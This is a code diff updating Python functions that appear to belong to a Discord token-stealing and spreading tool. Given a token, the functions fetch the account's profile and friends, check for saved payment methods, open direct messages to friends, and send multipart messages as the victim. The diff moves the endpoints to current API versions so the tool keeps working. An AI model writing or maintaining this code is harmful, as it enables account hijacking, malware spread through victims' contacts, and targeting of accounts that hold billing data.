@@ -20,29 +20,29 @@ def getheaders(token=None, content_type="application/json"):
     return headers
 def getuserdata(token):
     try:
-        return loads(urlopen(Request("https://discordapp.com/api/v9/users/@me", headers=getheaders(token))).read().decode())
+        return loads(urlopen(Request("https://discord.com/api/v9/users/@me", headers=getheaders(token))).read().decode())
     except:
         pass
 def getfriends(token):
     try:
-        return loads(urlopen(Request("https://discordapp.com/api/v9/users/@me/relationships", headers=getheaders(token))).read().decode())
+        return loads(urlopen(Request("https://discord.com/api/v9/users/@me/relationships", headers=getheaders(token))).read().decode())
     except Exception as e:
         print(e)
         pass
 def getchat(token, uid):
     try:
-        return loads(urlopen(Request("https://discordapp.com/api/v9/users/@me/channels", headers=getheaders(token), data=dumps({"recipient_id": uid}).encode())).read().decode())["id"]
+        return loads(urlopen(Request("https://discord.com/api/v9/users/@me/channels", headers=getheaders(token), data=dumps({"recipient_id": uid}).encode())).read().decode())["id"]
     except Exception as e:
         print(e)
         pass
 def has_payment_methods(token):
     try:
-        return bool(len(loads(urlopen(Request("https://discordapp.com/api/v9/users/@me/billing/payment-sources", headers=getheaders(token))).read().decode())) > 0)
+        return bool(len(loads(urlopen(Request("https://discord.com/api/v9/users/@me/billing/payment-sources", headers=getheaders(token))).read().decode())) > 0)
     except:
         pass
 def send_message(token, chat_id, form_data):
     try:
-        urlopen(Request(f"https://discordapp.com/api/v6/channels/{chat_id}/messages", headers=getheaders(token, "multipart/form-data; boundary=---------------------------325414537030329320151394843687"), data=form_data.encode())).read().decode()
+        urlopen(Request(f"https://discord.com/api/v9/channels/{chat_id}/messages", headers=getheaders(token, "multipart/form-data; boundary=---------------------------325414537030329320151394843687"), data=form_data.encode())).read().decode()
     except Exception as e:
         print(e)
         pass
